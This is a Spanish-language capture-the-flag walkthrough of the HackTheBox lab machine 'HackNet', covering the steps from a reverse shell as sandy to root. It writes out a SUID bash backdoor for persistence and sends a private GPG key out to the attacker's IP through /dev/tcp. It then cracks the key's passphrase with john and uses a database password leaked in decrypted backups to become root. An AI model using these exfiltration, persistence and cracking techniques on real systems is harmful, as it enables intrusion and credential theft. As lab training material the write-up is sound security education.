![image-center](/assets/images/posts/hacknet-18-hackthebox.png)
{: .align-center}


## Shell as `sandy`

Al solicitar `/explore` en la web, en nuestro listener recibiremos una consola como el usuario `sandy`

``` bash
nc -lvnp 443
Connection from 10.129.232.4:42666
bash: cannot set terminal process group (2770): Inappropriate ioctl for device
bash: no job control in this shell
sandy@hacknet:/var/www/HackNet$ 
sandy@hacknet:/var/www/HackNet$ id
id
uid=1001(sandy) gid=33(www-data) groups=33(www-data)
```

### TTY Treatment

Podemos mejorar la shell a través de un tratamiento de la TTY clásico, lanzando una pseudo-consola

``` bash
sandy@hacknet:/var/www/HackNet$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
sandy@hacknet:/var/www/HackNet$ ^Z
[1]  + 7889 suspended  nc -lvnp 443
andrees@HackBookPro exploits $ stty raw -echo;fg    
[1]  + 7889 continued  nc -lvnp 443
                                   reset xterm
sandy@hacknet:/var/www/HackNet$ export TERM=xterm
sandy@hacknet:/var/www/HackNet$ stty rows 42 columns 142
```

### Persistence

Hay muchas formas de establecer persistencia, la que elegí en mi caso fue hacer una copia de `bash` y asignarle el bit `SUID`

``` bash
sandy@hacknet:/var/www/HackNet$ cp /bin/bash /tmp/fakebash && chmod u+s /tmp/fakebash

mikey@hacknet:/var/tmp/django_cache$ /tmp/fakebash -p
fakebash-5.2$ whoami
sandy
```

Con este permiso podremos ejecutar `bash` como el usuario `sandy` cuando lo necesitemos si es que perdemos la conexión


## GPG Files Decrypt

En el directorio `backups` dentro de la ruta de la web, los archivos `.sql` están cifrados con GPG

> Un archivo `.gpg` es un fichero cifrado o firmado digitalmente usando `GNU Privacy Guard` (`GPG`), una herramienta de seguridad que protege la privacidad e integridad de datos sensibles, haciéndolos ilegibles sin la clave privada correcta para descifrarlos o verificar su autenticidad.
{: .notice--info}

``` bash
sandy@hacknet:/var/www/HackNet$ ls -la backups
total 56
drwxr-xr-x 2 sandy sandy  4096 Dec 29  2024 .
drwxr-xr-x 7 sandy sandy  4096 Jan 21 17:25 ..
-rw-r--r-- 1 sandy sandy 13445 Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 13713 Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 13851 Dec 29  2024 backup03.sql.gpg
```

Si listamos las claves disponibles para el usuario `sandy` en el anillo de llaves, veremos una clave pública

``` bash
sandy@hacknet:/var/www/HackNet/backups$ gpg --list-keys 
/home/sandy/.gnupg/pubring.kbx
------------------------------
pub   rsa1024 2024-12-29 [SC]
      21395E17872E64F474BF80F1D72E5C1FA19C12F7
uid           [ultimate] Sandy (My key for backups) <sandy@hacknet.htb>
sub   rsa1024 2024-12-29 [E]
```

El siguiente comando intenta descifrar el archivo usando la opción `-d` (o `--decrypt`)

``` bash
sandy@hacknet:/var/www/HackNet/backups$ gpg -d backup02.sql.gpg
```

Al lanzar el comando anterior, necesitaremos una contraseña de la clave privada para descifrar archivos

![image-center](/assets/images/posts/hacknet-19-hackthebox.png)
{: .align-center}

### Cracking

Dado que no disponemos de la contraseña, la intentaremos descubrir por fuerza bruta

> Un archivo `.asc` es una clave de cifrado pública o privada (de programas como `GPG`/`PGP`) codificada en formato `ASCII Armored`.
{: .notice--info}

Enviaremos una copia del contenido del archivo `armored.asc` a nuestra máquina para poder descifrarlo más cómodamente. 

Para ello, iniciaremos un listener por un puerto y luego con `cat` usando el redirector `>` y un socket TCP lo enviaremos a nuestra IP

``` bash
nc -lvnp 4444 > armored_key.asc

sandy@hacknet:/var/www/HackNet/backups$ cat ~/.gnupg/private-keys-v1.d/armored_key.asc > /dev/tcp/10.10.14.54/4444
```

La herramienta `gpg2john` nos permite extraer el hash de un archivo cifrado con `GPG` 

``` bash
gpg2john armored_key.asc | cut -d ':' -f2-2 | tee hash.tx      

File armored_key.asc
$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67dbd1c6b0c25b960d293cd490d0f54227788f93637a930a185ab86bc6d4bfd324fdb4f908b41696f71db01b3930cdfbc854a81adf642f5797f94ddf7e67052ded428ee6de69fd4c38f0c6db9fccc6730479b48afde678027d0628f0b9046699033299bc37b0345c51d7fa51f83c3d857b72a1e57a8f38302ead89537b6cb2b88d0a953854ab6b0cdad4af069e69ad0b4e4f0e9b70fc3742306d2ddb255ca07eb101b07d73f69a4bd271e4612c008380ef4d5c3b6fa0a83ab37eb3c88a9240ddeda8238fd202ccc9cf076b6d21602dd2394349950be7de440618bf93bcde73e68afa590a145dc0e1f3c87b74c0e2a96c8fe354868a40ec09dd217b815b310a41449dc5fbdfca513fadd5eeae42b65389aecc628e94b5fb59cce24169c8cd59816681de7b58e5f0d0e5af267bc75a8efe0972ba7e6e3768ec96040488e5c7b2aa0a4eb1047e79372b3605*3*254*2*7*16*db35bd29d9f4006bb6a5e01f58268d96*65011712*850ffb6e35f0058b
```

Iniciaremos un ataque de fuerza bruta con `john` o `hashcat` empleando el diccionario `rockyou.txt`. Al cabo de unos momentos obtendremos la contraseña

``` bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt

Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (?)
1g 0:00:00:50 DONE (2026-01-21 15:09) 0.01981g/s 8.361p/s 8.361c/s 8.361C/s sweetheart
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Decrypt

Ahora que tenemos la contraseña de la clave privada, procederemos a descifrar los archivos `.sql`

> Con las flags `--pinentry-mode=loopback` y `--passphrase` podemos omitir el cuadro de diálogo e intentar descifrar directamente el archivo en cuestión.
{: .notice--warning}

``` bash
sandy@hacknet:/var/www/HackNet/backups$ gpg --pinentry-mode=loopback --passphrase 'sweetheart' -d backup01.sql.gpg > out1.txt
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"

sandy@hacknet:/var/www/HackNet/backups$ gpg --pinentry-mode=loopback --passphrase 'sweetheart' -d backup02.sql.gpg > out2.txt
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
```


## Credentials Leakage

Podemos usar el comando `diff` para rápidamente ver las diferencias entre ambos archivos, ya que ambas son copias de seguridad de la base de datos

``` bash
sandy@hacknet:/var/www/HackNet/backups$ diff out1.txt out2.txt

< ) ENGINE=InnoDB AUTO_INCREMENT=47 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
---
> ) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
430c430,436
< (46,'2024-12-29 00:46:23.445332','Good to know. Thanks!',1,6,17);
---
> (46,'2024-12-29 00:46:23.445332','Good to know. Thanks!',1,6,17),
> (47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
> (48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
> (49,'2024-12-29 20:30:14.430878','Just tweaking some schema settings for the new project. Won’t take long, I promise.',1,22,18),
> (50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
> (51,'2024-12-29 20:30:56.880458','Got it. Thanks a lot! I’ll let you know as soon as I’m finished.',1,22,18),
> (52,'2024-12-29 20:31:16.112930','Cool. If anything goes wrong, ping me immediately.',0,18,22);
682c688
< (1,'pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ=','2024-12-29 20:25:13.143037',1,'admin','','','',1,1,'2024-08-08 18:17:54.472758');
---
> (1,'pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ=','2024-12-29 20:31:31.793215',1,'admin','','','',1,1,'2024-08-08 18:17:54.472758');
763c769
< ) ENGINE=InnoDB AUTO_INCREMENT=124 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
---
> ) ENGINE=InnoDB AUTO_INCREMENT=130 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
894c900
< -- Dump completed on 2024-12-29 15:25:43
---
> -- Dump completed on 2024-12-29 15:32:32
```

Hay una conversación que revela la contraseña del usuario `root` para conectarse a la base de datos

``` sql
> (48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
> (49,'2024-12-29 20:30:14.430878','Just tweaking some schema settings for the new project. Won’t take long, I promise.',1,22,18),
> (50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
```


## Root Time

Esta contraseña se reutiliza y nos permite lanzar una shell como el usuario `root`

``` bash
sandy@hacknet:/var/www/HackNet/backups$ su
Password: 
root@hacknet:/var/www/HackNet/backups# id
uid=0(root) gid=0(root) groups=0(root)
```

También podríamos haber iniciado sesión como `root` por `ssh`, aunque esta no es una buena práctica y es poco realista

``` bash
ssh root@hacknet.htb 
root@hacknet.htb\'s password: 

Last login: Wed Jan 21 17:51:08 2026 from 10.10.14.54
root@hacknet:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Ya podremos ver la flag ubicada en el directorio `/root`

``` bash
root@hacknet:/var/www/HackNet/backups# cd
root@hacknet:~# cat root.txt 
f24...
```

Gracias por leer, a continuación te dejo la cita del día.

> We can only be said to be alive in those moments when our hearts are conscious of our treasures.
> — Thornton Wilder
{: .notice--info}
